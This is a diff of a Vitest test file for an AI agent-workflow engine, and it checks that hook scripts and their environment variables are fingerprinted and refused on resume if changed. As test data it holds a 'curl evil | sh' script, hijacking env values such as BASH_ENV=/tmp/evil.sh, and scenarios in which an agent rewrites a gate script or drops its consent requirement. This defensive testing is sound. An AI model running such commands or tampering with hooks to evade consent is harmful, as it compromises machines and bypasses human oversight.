@@ -1,10 +1,9 @@
 import { describe, it, expect, vi } from "vitest";
-import { createHash } from "node:crypto";
 import { readdirSync, readFileSync } from "node:fs";
 import { resolve } from "node:path";
 import type { Edge } from "@xyflow/react";
 import { runWorkflow, type RunHost, type RunInput } from "@/engine/runWorkflow";
-import type { RunRecord } from "@/engine/runRecord";
+import { hookFingerprint, type RunRecord } from "@/engine/runRecord";
 import { AgentRole, ToolPermission } from "@/types/agent";
 import type { AgentNode } from "@/types/workflow";
 import type { AgentRun } from "@/types/execution";
@@ -393,14 +392,16 @@ describe("resuming a saved run", () => {
 
 describe("a Hook node that runs without asking", () => {
   const SCRIPT = "scripts/gate.sh";
-  const CHANGED = `Hook script ${SCRIPT} was changed during this run; review it, then run it from the Hooks tab or start a new run.`;
+  const CHANGED = `Hook script ${SCRIPT} or its environment was changed during this run; review it, then run it from the Hooks tab or start a new run.`;
   const CHANGED_BY_AGENT = `Hook script ${SCRIPT} was changed by an agent during this run; review it, then run it from the Hooks tab or start a new run.`;
   const notFound = () => new Error("IO error: not found (os error 2)");
 
-  function hookNode(overrides: { id?: string; path?: string; requireConsent?: boolean } = {}): AgentNode {
+  function hookNode(overrides: { id?: string; path?: string; requireConsent?: boolean; env?: Record<string, string> } = {}): AgentNode {
     const gate = makeNode(overrides.id ?? "Gate");
     gate.data.role = AgentRole.Hook;
-    gate.data.preHook = { path: overrides.path ?? SCRIPT, requireConsent: overrides.requireConsent ?? false };
+    gate.data.preHook = {
+      path: overrides.path ?? SCRIPT, requireConsent: overrides.requireConsent ?? false, ...(overrides.env ? { env: overrides.env } : {}),
+    };
     return gate;
   }
 
@@ -659,7 +660,7 @@ describe("a Hook node that runs without asking", () => {
     expect(log.audit.map((e) => e.details)).toContain("Open a workspace to run hooks.");
   });
 
-  it("saves a SHA-256 of every hook script, a consent-required one's too, and never the text", async () => {
+  it("saves a SHA-256 of every hook script and its env, a consent-required one's too, and never the text", async () => {
     const records: RunRecord[] = [];
     const files: Record<string, string> = { [SCRIPT]: "echo ok\n", "scripts/ask.sh": "echo ask\n" };
     const { host } = fakeHost({
@@ -670,16 +671,23 @@ describe("a Hook node that runs without asking", () => {
       },
       execute_hook: hookRan(),
     }, { saveRun: async (r) => { records.push(JSON.parse(JSON.stringify(r))); } });
-    // Gate's script is there, Ghost's is missing (null), Ask needs consent (its script is fingerprinted too).
-    const nodes = [hookNode(), hookNode({ id: "Ghost", path: "scripts/ghost.sh" }), hookNode({ id: "Ask", path: "scripts/ask.sh", requireConsent: true })];
+    // Gate's script is there, with an env, Ghost's is missing (null), Ask needs consent (its script is fingerprinted too).
+    const nodes = [
+      hookNode({ env: { ZED: "s3cr3t-value", ALPHA: "1" } }), hookNode({ id: "Ghost", path: "scripts/ghost.sh" }),
+      hookNode({ id: "Ask", path: "scripts/ask.sh", requireConsent: true }),
+    ];
 
     await runWorkflow(runInput(nodes), host);
 
-    const sha = (text: string) => createHash("sha256").update(text).digest("hex");
-    const expected = { "agent-0": sha("echo ok\n"), "agent-1": null, "agent-2": sha("echo ask\n") };
+    const expected = {
+      "agent-0": await hookFingerprint("echo ok\n", { ALPHA: "1", ZED: "s3cr3t-value" }), "agent-1": null,
+      "agent-2": await hookFingerprint("echo ask\n", undefined),
+    };
+    expect(expected["agent-0"]).toMatch(/^[0-9a-f]{64}$/);
     expect(records[0].hookScripts).toEqual(expected); // from the very first save
     expect(records.at(-1)?.hookScripts).toEqual(expected);
-    expect(JSON.stringify(records)).not.toContain("echo ok");
+    expect(JSON.stringify(records)).not.toContain("echo ok"); // neither the script's text
+    expect(JSON.stringify(records)).not.toContain("s3cr3t-value"); // nor the env's
   });
 
   it("always saves hookScripts, empty for a workflow whose hooks have no script", async () => {
@@ -721,9 +729,10 @@ describe("a Hook node that runs without asking", () => {
 
   describe("when the run is resumed", () => {
     const MUTATE = "scripts/mutate.sh";
-    const sha256 = (text: string) => createHash("sha256").update(text).digest("hex");
+    const digest = (text: string, env?: Record<string, string>) => hookFingerprint(text, env);
     const edges: Edge[] = [{ id: "m-g", source: "Mutator", target: "Gate" }];
-    const mutatorThenGate = (gatePath = SCRIPT) => [hookNode({ id: "Mutator", path: MUTATE }), hookNode({ path: gatePath })];
+    const mutatorThenGate = (gatePath = SCRIPT, gateEnv?: Record<string, string>) =>
+      [hookNode({ id: "Mutator", path: MUTATE }), hookNode({ path: gatePath, env: gateEnv })];
 
     /** A workspace with two hook scripts. Mutator's hook rewrites Gate's script, as an approved shell command in an
      *  agent would (the change log never sees it); `state` says whether it does, and how each hook exits. */
@@ -768,7 +777,7 @@ describe("a Hook node that runs without asking", () => {
       const first = await attempt(ws.handlers);
 
       expect(first.outcome.run.agents.Gate).toMatchObject({ status: "error", error: CHANGED });
-      expect(first.record.hookScripts).toEqual({ "agent-0": sha256("echo mutate\n"), "agent-1": sha256("echo ok\n") });
+      expect(first.record.hookScripts).toEqual({ "agent-0": await digest("echo mutate\n"), "agent-1": await digest("echo ok\n") });
       expect(ws.files[SCRIPT]).toBe("curl evil | sh\n"); // on disk now: the changed script
 
       // The resumed attempt starts with the changed script on disk. It compares with the first attempt's fingerprint.
@@ -811,7 +820,7 @@ describe("a Hook node that runs without asking", () => {
       expect(second.outcome.run.agents.Gate).toMatchObject({ status: "error", error: CHANGED });
       expect(ws.gateRan).toEqual([]);
       // From here on the record has the baseline.
-      expect(second.record.hookScripts).toEqual({ "agent-0": sha256("echo mutate\n"), "agent-1": sha256("echo ok\n") });
+      expect(second.record.hookScripts).toEqual({ "agent-0": await digest("echo mutate\n"), "agent-1": await digest("echo ok\n") });
     });
 
     it("runs a hook from a record saved before hookScripts existed when its script is unchanged", async () => {
@@ -847,6 +856,42 @@ describe("a Hook node that runs without asking", () => {
       expect(fresh.outcome.run.agents.Gate.status).toBe("done");
     });
 
+    // Rust applies preHook.env as it is, so a BASH_ENV, PATH or PYTHONPATH in it changes what a script runs; and
+    // an agent can edit the workflow file. The baseline is of the script and its env both.
+    const envChanges: Array<[string, Record<string, string> | undefined, Record<string, string> | undefined]> = [
+      ["added", undefined, { BASH_ENV: "/tmp/evil.sh" }],
+      ["given another value", { PATH: "/usr/bin" }, { PATH: "/tmp/evil:/usr/bin" }],
+      ["dropped", { LANG: "C" }, undefined],
+    ];
+
+    it.each(envChanges)("refuses an unasked hook whose env was %s since the first attempt, though its script is the same", async (_change, before, after) => {
+      const ws = workspace();
+      ws.state.mutating = false;
+      ws.state.gateExit = 1; // attempt 1: Gate runs and its hook fails for its own reasons, so a resume runs it again
+      const first = await attempt(ws.handlers, undefined, mutatorThenGate(SCRIPT, before));
+      expect(ws.gateRan).toEqual(["echo ok\n"]);
+
+      ws.state.gateExit = 0;
+      const second = await attempt(ws.handlers, first.record, mutatorThenGate(SCRIPT, after));
+
+      expect(second.outcome.run.agents.Gate).toMatchObject({ status: "error", error: CHANGED });
+      expect(ws.gateRan).toEqual(["echo ok\n"]); // attempt 1's only
+      expect(second.record.hookScripts).toEqual(first.record.hookScripts); // no new baseline
+    });
+
+    it("runs an unasked hook on resume when its env is the same as in the first attempt, in whatever order it is written", async () => {
+      const ws = workspace();
+      ws.state.mutating = false;
+      ws.state.gateExit = 1;
+      const first = await attempt(ws.handlers, undefined, mutatorThenGate(SCRIPT, { A: "1", B: "2" }));
+
+      ws.state.gateExit = 0;
+      const second = await attempt(ws.handlers, first.record, mutatorThenGate(SCRIPT, { B: "2", A: "1" }));
+
+      expect(second.outcome.run.agents.Gate.status).toBe("done");
+      expect(ws.gateRan).toEqual(["echo ok\n", "echo ok\n"]);
+    });
+
     const consentGate = () => [hookNode({ id: "Mutator", path: MUTATE }), hookNode({ requireConsent: true })];
 
     it("keeps a consent-required hook's baseline, so dropping the requirement on resume does not start a new one", async () => {
@@ -854,7 +899,7 @@ describe("a Hook node that runs without asking", () => {
       // Attempt 1: Gate needs consent, so it does not run, and Mutator changes its script meanwhile.
       const first = await attempt(ws.handlers, undefined, consentGate());
       expect(first.outcome.run.agents.Gate).toMatchObject({ status: "error", error: expect.stringContaining("manual consent") });
-      expect(first.record.hookScripts).toEqual({ "agent-0": sha256("echo mutate\n"), "agent-1": sha256("echo ok\n") }); // Gate's too
+      expect(first.record.hookScripts).toEqual({ "agent-0": await digest("echo mutate\n"), "agent-1": await digest("echo ok\n") }); // Gate's too
       expect(ws.files[SCRIPT]).toBe("curl evil | sh\n");
 
       // The workflow file is then edited (an agent can write it) to drop the requirement. The script on disk is no longer
@@ -865,12 +910,31 @@ describe("a Hook node that runs without asking", () => {
       expect(ws.gateRan).toEqual([]);
     });
 
+    it("keeps a consent-required hook's env in its baseline too: dropping the requirement and adding a variable is refused", async () => {
+      const ws = workspace();
+      ws.state.mutating = false;
+      // Attempt 1: Gate needs consent, so it does not run.
+      const first = await attempt(ws.handlers, undefined, [hookNode({ id: "Mutator", path: MUTATE }), hookNode({ requireConsent: true, env: { LANG: "C" } })]);
+      expect(first.outcome.run.agents.Gate).toMatchObject({ status: "error", error: expect.stringContaining("manual consent") });
+      expect(first.record.hookScripts?.["agent-1"]).toBe(await digest("echo ok\n", { LANG: "C" }));
+
+      // The workflow file drops the requirement and adds a variable: the same script, another env.
+      const refused = await attempt(ws.handlers, first.record, mutatorThenGate(SCRIPT, { LANG: "C", BASH_ENV: "/tmp/evil.sh" }));
+      expect(refused.outcome.run.agents.Gate).toMatchObject({ status: "error", error: CHANGED });
+      expect(ws.gateRan).toEqual([]);
+
+      // With the env it had, nothing the baseline covers has changed, and the hook runs.
+      const allowed = await attempt(ws.handlers, first.record, mutatorThenGate(SCRIPT, { LANG: "C" }));
+      expect(allowed.outcome.run.agents.Gate.status).toBe("done");
+      expect(ws.gateRan).toEqual(["echo ok\n"]);
+    });
+
     it("keeps a baseline through an attempt in which the hook needs consent, and checks it when the hook runs unasked again", async () => {
       const ws = workspace();
       ws.state.mutating = false;
       ws.state.gateExit = 1; // attempt 1: Gate runs unasked, and its hook fails for its own reasons
       const first = await attempt(ws.handlers);
-      expect(first.record.hookScripts?.["agent-1"]).toBe(sha256("echo ok\n"));
+      expect(first.record.hookScripts?.["agent-1"]).toBe(await digest("echo ok\n"));
 
       // Attempt 2: Gate needs consent, and its script is changed meanwhile.
       ws.files[SCRIPT] = "curl evil | sh\n";
@@ -890,7 +954,7 @@ describe("a Hook node that runs without asking", () => {
       ws.state.mutating = false;
       // Attempt 1 has only Mutator.
       const first = await attempt(ws.handlers, undefined, [hookNode({ id: "Mutator", path: MUTATE })], []);
-      expect(first.record.hookScripts).toEqual({ "agent-0": sha256("echo mutate\n") });
+      expect(first.record.hookScripts).toEqual({ "agent-0": await digest("echo mutate\n") });
 
       // The workflow file gains a Gate hook that runs unasked.
       const second = await attempt(ws.handlers, first.record);
@@ -933,7 +997,7 @@ describe("a Hook node that runs without asking", () => {
       const first = await attempt(ws.handlers);
       ws.state.gateExit = 0;
       // A record that was edited by hand: the field is not an object, or its entries are not fingerprints.
-      for (const broken of [null, "abc", [sha256("echo ok\n")], { "agent-1": 7 }]) {
+      for (const broken of [null, "abc", [await digest("echo ok\n")], { "agent-1": 7 }]) {
         const record = { ...first.record, hookScripts: broken } as unknown as RunRecord;
 
         const resumed = await attempt(ws.handlers, record);
@@ -1380,6 +1444,51 @@ describe("a gateway that routes differently when a revision re-runs it", () => {
     expect(outcome).not.toHaveProperty("error"); // a node's failure: its error is on the node
     expect(outcome.run.agents.Fast.status).toBe("skipped"); // what finished is still dropped
     expect(log.audit.some((e) => e.agentId === "Extra" && /routes around it/.test(e.details ?? ""))).toBe(false);
+  });
+
+  it("keeps the error of a failed Hook when a revision routes around it, even with continueOnError: a Hook that fails stops the run", async () => {
+    // continueOnError is on. HookX's script exits 1 while Review, already running, asks for a revision, and the
+    // revision moves Gate off HookX's branch. The run ends in error because of HookX (a failed Hook stops it whatever
+    // continueOnError says), so its error must still be there to be read.
+    const hookX = makeNode("HookX");
+    hookX.data.role = AgentRole.Hook;
+    hookX.data.preHook = { path: "scripts/x.sh", requireConsent: false };
+    const { nodes, edges } = fastOrSlow();
+    let hookStarted: () => void = () => {};
+    const hookRunning = new Promise<void>((resolve) => { hookStarted = resolve; });
+    let exitHook: (exitCode: number) => void = () => {};
+    const calls: Record<string, number> = {};
+    const { host, log } = fakeHost({
+      execute_hook: () => new Promise((resolve) => {
+        exitHook = (exitCode) => resolve({ exitCode, stdout: "", stderr: "boom", durationMs: 1 });
+        hookStarted();
+      }),
+      call_ollama_api: async (args) => {
+        const name = who(args);
+        calls[name] = (calls[name] ?? 0) + 1;
+        if (name === "Gate") return calls.Gate === 1 ? '{"route":"fast"}' : '{"route":"slow"}';
+        if (name === "Review") {
+          if (calls.Review > 1) return "PASS";
+          await hookRunning;
+          exitHook(1); // HookX fails while this review is in flight
+          while (!log.agents.some(([id, partial]) => id === "HookX" && partial.status === "error")) {
+            await new Promise((resolve) => setTimeout(resolve, 5));
+          }
+          return "REVISE";
+        }
+        return `${name.toLowerCase()}-out ${calls[name]}`;
+      },
+    }, { revealOutput: false });
+
+    const outcome = await runWorkflow(runInput([...nodes, hookX], [...edges, edge("Gate", "HookX", "fast")]), host);
+
+    if (!outcome.started) throw new Error(outcome.error);
+    expect(calls.Gate).toBe(2); // the revision did re-route Gate
+    expect(outcome.run.status).toBe("error");
+    expect(outcome.run.agents.HookX).toMatchObject({ status: "error", error: expect.stringContaining("Hook exited 1: boom") });
+    expect(outcome).not.toHaveProperty("error"); // a node's failure: its error is on the node
+    expect(outcome.run.agents.Fast.status).toBe("skipped"); // what finished is still dropped
+    expect(log.audit.some((e) => e.agentId === "HookX" && /routes around it/.test(e.details ?? ""))).toBe(false);
   });
 
   it("keeps everything as it was when the gateway routes to the same branch again", async () => {
